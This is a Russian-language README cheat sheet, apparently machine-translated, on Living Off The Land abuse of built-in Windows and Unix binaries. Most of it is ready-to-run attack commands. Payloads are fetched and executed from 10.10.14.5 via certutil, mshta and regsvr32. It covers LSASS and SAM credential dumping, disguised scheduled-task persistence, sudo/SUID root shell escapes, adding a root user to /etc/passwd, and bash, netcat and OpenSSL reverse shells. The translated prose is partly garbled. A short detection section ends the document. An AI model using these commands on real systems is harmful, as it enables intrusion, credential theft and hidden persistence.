<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Жизнь за счет земли (LOLBAS и GTFOBins) — полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Уклонение от защиты">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Жизнь за счет земли">
</p>

<p выравнивание="центр">
  <b>🛠️ Подробный справочник по злоупотреблению законными предустановленными системными двоичными файлами для выполнения кода, загрузки полезных данных и повышения привилегий</b>
</p>

---

## 📋 Содержание

- [Введение](#-введение)
- [Зачем жить за счет земли?] (#-почему-жить-за счет земли)
- [Часть 1: Windows LOLBAS](#-part-1-windows-lolbas)
  - [Загрузка и вход файла](#file-download--ingress)
  - [Выполнение кода и обход AppLocker](#code-execution--applocker-bypass)
  - [Сброс учетных данных (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Разведка и открытия](#reconnaissance--discovery)
  - [Постоянство и запланированные задачи](#persistence--scheduled-tasks)
- [Часть 2: Unix/Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID и экранирование оболочки Sudo](#suid--sudo-shell-escapes)
  - [Эксплуатация чтения и записи файлов](#file-read--write-exploitation)
  - [Вход в сеть и обратные оболочки](#network-ingress--reverse-shells)
  - [GTFOBins Высокоэффективные переводчики](#gtfobins-high-impact-interpreters)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)
- [Ресурсы](#-ресурсы)

---

## 🎯 Введение

**Living Off The Land (LotL)** — это метод, разработанный после эксплуатации, в котором злоумышленники и красные команды используют исключительно законные, встроенные, доверенные системные двоичные файлы, сценарии и библиотеки, уже присутствующие в операционной системе.

- **LOLBAS (Windows):** Жизнь за счет земли Двоичные файлы, сценарии и библиотеки.
- **GTFOBins (Unix/Linux):** тщательно подобранная коллекция двоичных файлов Unix, которыми можно злоупотреблять для обхода локальных ограничений безопасности, выхода из ограниченных оболочек и повышения привилегий.

---

## ⚖️ Зачем жить за счет земли?

1. 🛡️ **Обходит белый список приложений:** Двоичные файлы, такие как `certutil.exe`, `rundll32.exe` или `find`, имеют цифровую подпись Microsoft или поставщиков ОС и им доверяют AppLocker, WDAC и SELinux.
2. 👁️ **Обход AV/EDR на основе сигнатур:** Никакие посторонние вредоносные исполняемые файлы (`.exe`, `.elf`) не сбрасываются на диск.
3. 📉 **Низкое энергопотребление:** Уменьшает количество аномалий при анализе журналов за счет использования встроенных инструментов администрирования.

---

## 🪟 Часть 1: Windows LOLBAS

### Загрузка и вход файлов

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe и PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Выполнение кода и обход AppLocker

#### 1. Mshta.exe (выполнение удаленного HTA/VBScript)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (техника Squiblidoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (выполнение XSL-скрипта)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Установитьutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Сброс учетных данных (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (дамп LSASS)
Дамп памяти процесса LSASS, не удаляя Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (сохранение кустов SAM, SYSTEM и SECURITY)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Разведка и открытия
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Постоянство и запланированные задачи
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Часть 2: Unix/Linux GTFOBins

### SUID и экранирование оболочки Sudo

Если двоичный файл имеет установленный SUID (`chmod u+s`) или предоставлен в `sudo -l`, используйте его для немедленной корневой оболочки:

#### 1. Судо/SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Судо/SUID `vim`/`vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Судо/SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Судо/SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Судо/SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Судо/SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Судо `less`/`more`/`man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Использование чтения и записи файлов

Если вы не можете создать оболочку напрямую, используйте утилиты чтения/записи файлов, чтобы перезаписать `/etc/passwd` или прочитать `/etc/shadow`:

#### Перезаписать `/etc/passwd` через Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Чтение конфиденциальных файлов через двоичные файлы SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Вход в сеть и обратные оболочки

Передача файлов и удаление оболочек без `curl` или `wget`:

#### 1. Bash Native TCP Reverse Shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Собственный Netcat (без флага `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. Обратная оболочка с шифрованием OpenSSL
На злоумышленника:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
В цель:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins Высокоэффективные переводчики

Если переводчикам предоставлен Sudo/SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Краткая справочная таблица

| ОС | Двоичный | Цель | Команда злоупотреблений |
|----|--------|---------|---------------|
| **Победа** | `certutil.exe` | Скачать файл | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Победа** | `mshta.exe` | Удаленный руководитель HTA | `mshta http://<IP>/payload.hta` |
| **Победа** | `regsvr32.exe` | Скриптлет-исполнитель | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Победа** | `rundll32.exe` | Дамп LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Юникс**| `find` | СУИД Оболочка | `find . -exec /bin/sh -p \; -quit` |
| **Юникс**| `awk` | Судо Шелл | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Юникс**| `vim` | Побег из ракушки | `vim -c ':!/bin/sh'` |
| **Юникс**| `tee` | Перезаписать файл | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Аудит ведения журнала командной строки:**
   Включите **Sysmon (идентификатор события 1)** и ведение журнала создания процессов Windows (идентификатор события 4688) с аудитом командной строки для отслеживания аномальных аргументов, передаваемых в `certutil`, `mshta` и `rundll32`.
2. **Блокируйте вредоносные отношения между родителями и детьми:**
   Следите за `mshta.exe` или `regsvr32.exe`, порождающими `cmd.exe` или `powershell.exe`.
3. **Ограничить директивы Sudo:**
   Избегайте подстановочных знаков (`*`) в `/etc/sudoers`. Никогда не позволяйте пользователям запускать текстовые редакторы (`vim`, `nano`) или компиляторы от имени пользователя root.

---

## ⚠️ Юридическая оговорка

> **ВАЖНО:** методы «Жизнь за счет земли» злоупотребляют надежными административными утилитами. Эта шпаргалка предназначена исключительно для авторизованных оценок безопасности, укрепления защиты и образовательных исследований.

---

## 📚 Ресурсы

- [Официальный репозиторий проекта LOLBAS](https://lolbas-project.github.io/)
- [Официальный репозиторий GTFObins](https://gtfobins.github.io/)
- [MITRE ATT&CK: Подрыв контроля доверия (T1564)] (https://attack.mitre.org/techniques/T1564/)